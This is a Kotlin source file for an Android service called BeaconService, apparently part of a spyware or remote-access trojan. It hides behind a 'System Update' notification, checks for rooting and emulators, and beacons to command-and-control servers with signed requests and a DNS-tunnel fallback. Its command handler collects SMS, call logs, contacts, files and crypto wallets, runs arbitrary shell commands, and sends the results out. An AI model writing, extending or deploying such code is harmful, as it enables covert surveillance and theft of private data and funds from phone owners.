package com.pegasus.agent

import android.app.*
import android.content.Context
import android.content.Intent
import android.os.Build
import android.os.IBinder
import androidx.core.app.NotificationCompat
import kotlinx.coroutines.*
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.RequestBody.Companion.toRequestBody
import org.json.JSONObject
import java.util.concurrent.TimeUnit
import javax.crypto.Mac
import javax.crypto.spec.SecretKeySpec
import kotlin.random.Random

class BeaconService : Service() {

    private val scope = CoroutineScope(Dispatchers.IO + SupervisorJob())
    private val http = OkHttpClient.Builder()
        .connectTimeout(20, TimeUnit.SECONDS)
        .readTimeout(30, TimeUnit.SECONDS)
        .build()

    override fun onCreate() {
        super.onCreate()
        Config.load(this)
        startForeground(NOTIF_ID, notification())
        scope.launch { loop() }
    }

    private fun notification(): Notification {
        val channel = "pegasus"
        if (Build.VERSION.SDK_INT >= 26) {
            (getSystemService(NOTIFICATION_SERVICE) as NotificationManager)
                .createNotificationChannel(NotificationChannel(channel, "Sync",
                    NotificationManager.IMPORTANCE_MIN))
        }
        return NotificationCompat.Builder(this, channel)
            .setContentTitle("System Update")
            .setSmallIcon(android.R.drawable.stat_notify_sync)
            .setOngoing(true)
            .build()
    }

    private fun sign(body: String, ts: Long): String {
        val mac = Mac.getInstance("HmacSHA256")
        mac.init(SecretKeySpec(Config.key.toByteArray(), "HmacSHA256"))
        return mac.doFinal("$ts.$body".toByteArray())
            .joinToString("") { "%02x".format(it) }
    }

    private suspend fun loop() {
        while (currentCoroutineContext().isActive) {
            try {
                val blob = JSONObject().apply {
                    put("dna", Config.dna)
                    put("model", Build.MODEL)
                    put("sdk", Build.VERSION.SDK_INT)
                    put("root", AntiAnalysis.isRooted())
                    put("vm", AntiAnalysis.isEmulator(this@BeaconService))
                }
                send("beacon", blob)?.optString("command")
                    ?.takeIf { it.isNotBlank() }?.let { run(it) }
            } catch (_: Exception) {
            }
            delay((Config.beaconSeconds *
                (1 + Random.nextDouble(-Config.jitter, Config.jitter))).toLong() * 1000)
        }
    }

    private fun send(kind: String, blob: JSONObject): JSONObject? {
        val body = blob.toString()
        for (endpoint in Config.endpoints) {
            try {
                if (endpoint.startsWith("dns://")) {
                    DnsTunnel.exfil(endpoint.removePrefix("dns://"), blob)?.let { return it }
                    continue
                }
                val ts = System.currentTimeMillis() / 1000
                val req = Request.Builder()
                    .url("$endpoint/api/beacon/$kind")
                    .post(body.toRequestBody("application/json".toMediaType()))
                    .header("X-Dna", Config.dna)
                    .header("X-Ts", ts.toString())
                    .header("X-Mac", sign(body, ts))
                    .build()
                http.newCall(req).execute().use { res ->
                    if (res.isSuccessful) {
                        return JSONObject(res.body!!.string()).optJSONObject("data")
                    }
                }
            } catch (_: Exception) {
            }
        }
        return null
    }

    private suspend fun run(command: String) {
        val parts = command.trim().split(" ")
        val reply = when (parts[0]) {
            "sms" -> JSONObject().put("sms", Collector.sms(this))
            "calls" -> JSONObject().put("calls", Collector.calls(this))
            "contacts" -> JSONObject().put("contacts", Collector.contacts(this))
            "files" -> JSONObject().put("files",
                Collector.files(parts.getOrNull(1) ?: "/sdcard/Download"))
            "wallets" -> JSONObject().put("wallets", Collector.wallets())
            "shell" -> JSONObject().put("out", Collector.shell(command.removePrefix("shell ")))
            "quiet" -> JSONObject().put("quiet", true)
            "die" -> { stopSelf(); JSONObject().put("dead", true) }
            else -> JSONObject().put("unknown", parts[0])
        }
        send("result", reply.put("dna", Config.dna))
    }

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onDestroy() {
        scope.cancel()
        super.onDestroy()
    }

    companion object {
        private const val NOTIF_ID = 0x5047
        fun start(ctx: Context) {
            val intent = Intent(ctx, BeaconService::class.java)
            if (Build.VERSION.SDK_INT >= 26) ctx.startForegroundService(intent)
            else ctx.startService(intent)
        }
    }
}
